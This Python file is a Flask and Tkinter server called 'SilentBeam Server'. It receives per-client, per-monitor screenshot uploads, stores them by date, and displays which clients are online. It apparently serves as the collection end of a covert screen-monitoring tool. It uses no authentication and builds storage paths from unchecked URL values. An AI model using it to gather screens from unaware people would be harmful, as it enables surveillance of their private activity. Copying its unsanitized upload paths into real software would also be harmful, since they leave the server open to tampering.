from flask import Flask, request
from threading import Thread, Lock
import os, time, queue
from datetime import datetime
import tkinter as tk
from tkinter import ttk, scrolledtext

# --- Flask server setup ---
app = Flask(__name__)
DATA_DIR = "received"
PORT = 8081
STALE_SEC = 20  # consider client offline if no uploads within this many seconds
os.makedirs(DATA_DIR, exist_ok=True)

_clients = {}
_clients_lock = Lock()
_log_q = queue.Queue()


def _log(msg: str):
    _log_q.put(f"{datetime.now().strftime('%H:%M:%S')} {msg}")


@app.route("/<client_id>/<monitor_num>/upload", methods=["POST"])
def upload(client_id: str, monitor_num: str):
    # Save to received/<client_id>/<YYYYMMDD>/<monitor_num>/
    date_str = datetime.now().strftime("%Y%m%d")
    mon_folder = os.path.join(DATA_DIR, client_id, date_str, monitor_num)
    os.makedirs(mon_folder, exist_ok=True)

    saved_count = 0
    for file_key in request.files:
        f = request.files[file_key]
        ts = datetime.now().strftime("%Y%m%d%H%M%S%f")
        filename = f"{ts}_{file_key}.webp"
        f.save(os.path.join(mon_folder, filename))
        saved_count += 1

    now = time.time()
    with _clients_lock:
        client = _clients.get(client_id)
        if not client:
            client = {"monitors": {}}
            _clients[client_id] = client
            _log(f"New client discovered: {client_id}")
        mon_key = str(monitor_num)
        mon_entry = client["monitors"].get(mon_key)
        if not mon_entry:
            mon_entry = {"last_seen": 0.0, "uploads": 0, "status": "red"}
            client["monitors"][mon_key] = mon_entry
            _log(f"{client_id} monitor {monitor_num} discovered")
        mon_entry["last_seen"] = now
        mon_entry["uploads"] += saved_count

    _log(f"{client_id} m{monitor_num}: received {saved_count} file(s)")
    return "OK", 200


def _run_flask():
    _log(f"Server starting on 0.0.0.0:{PORT}")
    app.run(host="0.0.0.0", port=PORT, threaded=True, debug=False, use_reloader=False)


# --- Tkinter GUI ---
def _format_age(ts: float) -> str:
    d = max(0, int(time.time() - ts))
    return f"{d}s" if d < 60 else f"{d//60}m{d%60:02d}s"


def _launch_gui():
    root = tk.Tk()
    root.title("SilentBeam Server")
    root.geometry("780x520")

    frame = ttk.Frame(root)
    frame.pack(fill="both", expand=True, padx=8, pady=8)

    cols = ("status", "client", "monitor", "last_seen", "uploads")
    tree = ttk.Treeview(frame, columns=cols, show="headings", height=12)
    tree.heading("status", text="Status")
    tree.heading("client", text="Client")
    tree.heading("monitor", text="Monitor")
    tree.heading("last_seen", text="Last Seen")
    tree.heading("uploads", text="Uploads")
    tree.column("status", width=70, anchor="center")
    tree.column("client", width=260)
    tree.column("monitor", width=90, anchor="center")
    tree.column("last_seen", width=120, anchor="center")
    tree.column("uploads", width=90, anchor="center")
    tree.tag_configure("green", foreground="green")
    tree.tag_configure("red", foreground="red")
    tree.pack(fill="both", expand=True)

    ttk.Label(frame, text="Log").pack(anchor="w", pady=(8, 0))
    logbox = scrolledtext.ScrolledText(frame, height=10, state="disabled")
    logbox.pack(fill="both", expand=False)

    def refresh_clients():
        now = time.time()
        with _clients_lock:
            snapshot = {
                cid: {"monitors": {mk: me.copy() for mk, me in c.get("monitors", {}).items()}}
                for cid, c in _clients.items()
            }
        # One row per (client, monitor)
        for cid, data in snapshot.items():
            for mk, me in data["monitors"].items():
                status = "green" if now - me.get("last_seen", 0) <= STALE_SEC else "red"
                # Update stored status and log transitions
                with _clients_lock:
                    current = _clients.get(cid, {}).get("monitors", {}).get(mk, {}).get("status")
                    if current != status:
                        _clients[cid]["monitors"][mk]["status"] = status
                        _log(f"{cid} monitor {mk} status -> {status.upper()}")
                row_id = f"{cid}:{mk}"
                vals = (
                    "●",
                    cid,
                    mk,
                    _format_age(me.get("last_seen", 0)),
                    me.get("uploads", 0),
                )
                if tree.exists(row_id):
                    tree.item(row_id, values=vals, tags=(status,))
                else:
                    tree.insert("", "end", iid=row_id, values=vals, tags=(status,))
        root.after(1000, refresh_clients)

    def pump_logs():
        changed = False
        while True:
            try:
                msg = _log_q.get_nowait()
            except queue.Empty:
                break
            else:
                if not changed:
                    logbox.configure(state="normal")
                    changed = True
                logbox.insert("end", msg + "\n")
        if changed:
            logbox.see("end")
            logbox.configure(state="disabled")
        root.after(250, pump_logs)

    root.after(250, pump_logs)
    root.after(1000, refresh_clients)
    root.mainloop()


if __name__ == "__main__":
    t = Thread(target=_run_flask, daemon=True)
    t.start()
    _launch_gui()
